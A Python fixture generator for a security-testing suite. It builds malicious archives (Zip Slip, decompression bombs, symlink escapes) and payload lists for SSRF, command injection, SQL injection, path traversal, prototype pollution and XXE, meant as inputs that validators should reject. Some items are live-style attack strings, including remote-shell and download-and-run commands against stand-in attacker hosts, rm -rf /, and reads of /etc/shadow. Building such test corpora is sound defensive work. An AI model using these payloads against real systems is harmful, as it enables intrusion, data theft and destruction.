# @ecdat-synthetic-corpus
"""
ECDAT Adversarial Fixture Generator (Phase 26 - P1)

Deterministically generates intentionally malicious archives and test payload corpora for:
- Zip Slip (relative traversal ../, windows backslash ..\\, absolute paths)
- Decompression bombs (high expansion ratio > 100:1, lying headers, nested archives)
- Symlink & hardlink filesystem escapes
- SSRF exploit payloads (cloud metadata, loopback, RFC1918, IPv6, octal/hex IP encodings)
- Command injection vectors (shell metacharacters, subshells, pipes, newlines)
- SQL injection vectors (tautologies, stacked queries, UNION injection, comment truncations)
- Path traversal vectors (canonical escape sequences, null-bytes, URL encodings)
- Prototype pollution payloads (__proto__, constructor.prototype)
- XML / XXE entity injection payloads (external entities, recursive entity expansion)
- CBOM schema tampering & corrupted cryptographic component fixtures

All fixtures are certified synthetic fixtures for adversarial security control verification.
"""

import io
import json
import os
import struct
import tarfile
import zipfile
from pathlib import Path

FIXTURES_DIR = Path(__file__).resolve().parent
ARCHIVES_DIR = FIXTURES_DIR / "malicious_archives"
PAYLOADS_DIR = FIXTURES_DIR / "malicious_payloads"


def generate_archive_fixtures():
    ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)

    # 1. Zip Slip relative traversal (../../evil_relative.txt)
    p1 = ARCHIVES_DIR / "zip_slip_relative.zip"
    with zipfile.ZipFile(p1, "w") as zf:
        zf.writestr("../../evil_relative.txt", "MALICIOUS_RELATIVE_TRAVERSAL\n")

    # 2. Zip Slip Windows backslash (..\\..\\windows\\system32\\calc.exe)
    p2 = ARCHIVES_DIR / "zip_slip_windows.zip"
    with zipfile.ZipFile(p2, "w") as zf:
        zf.writestr("..\\..\\windows\\system32\\calc.exe", "MALICIOUS_BACKSLASH_TRAVERSAL\n")

    # 3. Absolute Unix path (/etc/shadow)
    p3 = ARCHIVES_DIR / "absolute_unix_path.zip"
    with zipfile.ZipFile(p3, "w") as zf:
        zf.writestr("/etc/shadow", "MALICIOUS_ABSOLUTE_UNIX\n")

    # 4. Absolute Windows path (C:\\Windows\\win.ini)
    p4 = ARCHIVES_DIR / "absolute_windows_path.zip"
    with zipfile.ZipFile(p4, "w") as zf:
        zf.writestr("C:\\Windows\\win.ini", "MALICIOUS_ABSOLUTE_WINDOWS\n")

    # 5. Symlink escape (tar with symlink pointing to /etc/passwd)
    p5 = ARCHIVES_DIR / "symlink_escape.tar"
    with tarfile.open(p5, "w") as tar:
        ti = tarfile.TarInfo(name="sym_escape.txt")
        ti.type = tarfile.SYMTYPE
        ti.linkname = "/etc/passwd"
        tar.addfile(ti)

    # 6. Hardlink escape (tar with hardlink pointing outside base)
    p6 = ARCHIVES_DIR / "hardlink_escape.tar"
    with tarfile.open(p6, "w") as tar:
        ti = tarfile.TarInfo(name="hard_escape.txt")
        ti.type = tarfile.LNKTYPE
        ti.linkname = "../../root_secret.txt"
        tar.addfile(ti)

    # 7. Decompression bomb ratio (>100:1 expansion ratio)
    p7 = ARCHIVES_DIR / "decompression_bomb_ratio.zip"
    raw_zeros = b"\x00" * (2 * 1024 * 1024)  # 2 MB of zeros compresses to ~2 KB (>1000:1)
    with zipfile.ZipFile(p7, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb_2mb.txt", raw_zeros)

    # 8. Lying headers (declared small size, actual huge size stream)
    p8 = ARCHIVES_DIR / "decompression_bomb_lying_header.zip"
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("lying.txt", b"A" * 65536)
    zip_bytes = bytearray(bio.getvalue())
    # Modify uncompressed size in local file header (offset 22 in standard zip entry)
    struct.pack_into("<I", zip_bytes, 22, 10)  # lie that uncompressed size is 10 bytes
    p8.write_bytes(zip_bytes)

    # 9. Nested archive (zip inside zip with directory traversal)
    p9 = ARCHIVES_DIR / "nested_archive.zip"
    inner_bio = io.BytesIO()
    with zipfile.ZipFile(inner_bio, "w") as inner_zf:
        inner_zf.writestr("../nested_escape.txt", "MALICIOUS_NESTED_ESCAPE\n")
    with zipfile.ZipFile(p9, "w") as outer_zf:
        outer_zf.writestr("inner.zip", inner_bio.getvalue())

    # 10. Corrupt / truncated archive
    p10 = ARCHIVES_DIR / "malformed_corrupt.zip"
    p10.write_bytes(b"PK\x03\x04" + b"\xFF" * 32)


def generate_payload_fixtures():
    PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)

    # 1. SSRF Payloads
    ssrf_payloads = {
        "positive": [
            "https://api.github.com/repos/example/repo",
            "https://repo.maven.apache.org/maven2",
            "https://registry.npmjs.org/express",
            "https://pypi.org/pypi/requests/json",
        ],
        "negative": [
            "not_a_valid_url",
            "ftp:///empty_host",
            "http://",
            "://missing-scheme.com",
        ],
        "boundary": [
            "http://a.com",
            f"https://example.com/{'a' * 2000}",
            "http://1.1.1.1",
            "http://8.8.8.8:443",
        ],
        "malicious": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/computeMetadata/v1/",
            "http://127.0.0.1:8080/admin",
            "http://127.0.0.1/status",
            "http://[::1]:3000/internal",
            "http://0.0.0.0:80/secret",
            "http://10.0.0.1/internal-api",
            "http://172.16.0.5/admin",
            "http://192.168.1.1/router",
            "http://0177.0.0.1/",  # Octal loopback notation
            "http://0x7f000001/",  # Hex loopback notation
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "dict://127.0.0.1:11211/stats",
        ],
        "regression": [
            "http://169.254.169.254",  # AWS IMDSv1
            "http://metadata.google.internal/computeMetadata/v1/",
            "git://github.com/--upload-pack=evil",  # Git pseudo-protocol injection
        ],
    }
    (PAYLOADS_DIR / "ssrf_payloads.json").write_text(json.dumps(ssrf_payloads, indent=2), encoding="utf-8")

    # 2. Command Injection Payloads
    command_injection_payloads = {
        "positive": [
            "scan-repo",
            "checkov-compliance-job",
            "target-2026-v1.0.4",
            "build_matrix_release",
        ],
        "negative": [
            "",
            "   ",
        ],
        "boundary": [
            "a" * 128,
            "a" * 1024,
            "valid-name_with.dots-and_hyphens",
        ],
        "malicious": [
            "scan; rm -rf /",
            "job | whoami",
            "scan & calc.exe",
            "repo && cat /etc/shadow",
            "repo `id`",
            "repo $(touch /tmp/pwned)",
            "repo\nrm -rf /",
            "repo\r\ndir",
            "repo || ls -la",
            "$(cat /etc/passwd)",
            "`curl http://attacker.com/rev.sh | sh`",
        ],
        "regression": [
            "scanner; cat /etc/passwd",  # SEC-REG-001 shell chaining
            "target | nc evil.com 4444",
        ],
    }
    (PAYLOADS_DIR / "command_injection_payloads.json").write_text(json.dumps(command_injection_payloads, indent=2), encoding="utf-8")

    # 3. SQL Injection Payloads
    sql_injection_payloads = {
        "positive": [
            "tenant-alpha-001",
            "scan_id_94829",
            "user.name@example.com",
            "algorithm-sha256",
        ],
        "negative": [
            "",
            None,
        ],
        "boundary": [
            "x" * 255,
            "ID_00000000000000000000000000000001",
        ],
        "malicious": [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "' UNION SELECT username, password FROM users --",
            "'; DROP TABLE scans; --",
            "1; EXEC xp_cmdshell('dir'); --",
            "' OR 'a'='a' /*",
            "\" OR \"1\"=\"1",
            "admin') OR ('1'='1",
        ],
        "regression": [
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
        ],
    }
    (PAYLOADS_DIR / "sql_injection_payloads.json").write_text(json.dumps(sql_injection_payloads, indent=2), encoding="utf-8")

    # 4. Path Traversal Payloads
    path_traversal_payloads = {
        "positive": [
            "safe_reports/summary.json",
            "cbom/cyclonedx_1.6.json",
            "scans/2026/09/scan_run.log",
        ],
        "negative": [
            "",
            "   ",
        ],
        "boundary": [
            "a" * 255,
            "nested/" + "/".join(["dir"] * 20) + "/file.txt",
        ],
        "malicious": [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/shadow",
            "C:\\Windows\\win.ini",
            "safe/../../../../secret.pem",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "safe/file.txt\x00/../../etc/passwd",
            "CON",
            "NUL",
            "AUX",
            "file.txt::$DATA",
        ],
        "regression": [
            "../../etc/passwd",
            "..\\..\\windows\\win.ini",
        ],
    }
    (PAYLOADS_DIR / "path_traversal_payloads.json").write_text(json.dumps(path_traversal_payloads, indent=2), encoding="utf-8")

    # 5. Prototype Pollution Payloads
    prototype_pollution_payloads = {
        "positive": {
            "title": "Clean Scan Job",
            "algorithm": "AES-256-GCM",
            "settings": {"key_size": 256},
        },
        "negative": None,
        "boundary": {
            "empty": {},
            "deep": {"a": {"b": {"c": {"d": "val"}}}},
        },
        "malicious": [
            {"__proto__": {"polluted": True, "isAdmin": True}},
            {"constructor": {"prototype": {"polluted": True}}},
            {"prototype": {"isAdmin": True}},
        ],
        "regression": [
            {"__proto__": {"polluted": True}},  # SEC-REG-003
        ],
    }
    (PAYLOADS_DIR / "prototype_pollution_payloads.json").write_text(json.dumps(prototype_pollution_payloads, indent=2), encoding="utf-8")

    # 6. XXE XML Payloads
    xxe_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!-- @ecdat-synthetic-corpus -->
<!-- Adversarial XXE Test Corpora -->
<test_fixtures>
  <positive>
    <cbom version="1.6">
      <component name="AES" keyLength="256" />
    </cbom>
  </positive>

  <malicious_file_read>
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <data>&xxe;</data>
  </malicious_file_read>

  <malicious_ssrf>
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    ]>
    <data>&xxe;</data>
  </malicious_ssrf>

  <malicious_billion_laughs>
    <!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    ]>
    <data>&lol3;</data>
  </malicious_billion_laughs>
</test_fixtures>
"""
    (PAYLOADS_DIR / "xxe_payloads.xml").write_text(xxe_xml, encoding="utf-8")

    # 7. Malicious CBOM Fixtures
    cbom_fixtures = {
        "positive": {
            "bomFormat": "CycloneDX",
            "specVersion": "1.6",
            "version": 1,
            "components": [
                {
                    "type": "cryptographic-asset",
                    "name": "AES-256-GCM",
                    "cryptoProperties": {
                        "assetType": "algorithm",
                        "algorithmProperties": {
                            "primitive": "ae",
                            "parameterSetIdentifier": "256",
                            "executionEnvironment": "software-plain",
                        },
                    },
                }
            ],
        },
        "negative": {
            "bomFormat": "UnknownFormat",
            "specVersion": "0.9",
        },
        "boundary": {
            "bomFormat": "CycloneDX",
            "specVersion": "1.6",
            "version": 1,
            "components": [],  # Empty components boundary
        },
        "malicious": [
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.6",
                "version": 1,
                "components": [
                    {
                        "type": "cryptographic-asset",
                        "name": "FORGED_ALGO",
                        "cryptoProperties": {
                            "assetType": "algorithm",
                            "algorithmProperties": {
                                "primitive": "unknown",
                                "parameterSetIdentifier": "-256",  # Negative key length
                            },
                        },
                    }
                ],
            },
            {
                "bomFormat": "CycloneDX",
                "specVersion": "99.99",  # Unsupported future spec
                "version": -1,
                "components": "not_an_array",  # Corrupted type
            },
        ],
        "regression": [
            {
                "bomFormat": "CycloneDX",
                "specVersion": "1.7",
                "version": 1,
                "metadata": {"fabricated": True},  # Fabricated metadata rejection
                "components": [],
            }
        ],
    }
    (PAYLOADS_DIR / "cbom_malicious_fixtures.json").write_text(json.dumps(cbom_fixtures, indent=2), encoding="utf-8")


if __name__ == "__main__":
    generate_archive_fixtures()
    generate_payload_fixtures()
    print("Successfully generated all adversarial fixtures and malicious corpora.")
